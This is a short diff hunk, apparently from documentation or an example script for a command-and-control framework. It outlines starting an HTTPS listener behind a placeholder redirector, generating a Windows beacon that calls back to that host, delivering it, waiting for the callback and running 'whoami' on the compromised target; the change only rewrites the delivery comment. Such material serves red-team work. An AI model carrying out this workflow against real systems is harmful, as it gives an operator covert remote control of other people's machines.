@@ -121,7 +121,7 @@ connect()
 set_noise("yellow")
 start_https_listener(port=443, domain="<redirector>")
 generate_beacon(c2_host="<redirector>", os="windows", interval=60, jitter=30)
-# … deliver the beacon (payload-delivery / loader-injection-tradecraft) …
+# … deliver the beacon — see docs/delivery.md for session-safe detachment …
 poll_events()            # watch for the callback
 list_sessions()
 execute_command(target_id, "whoami")
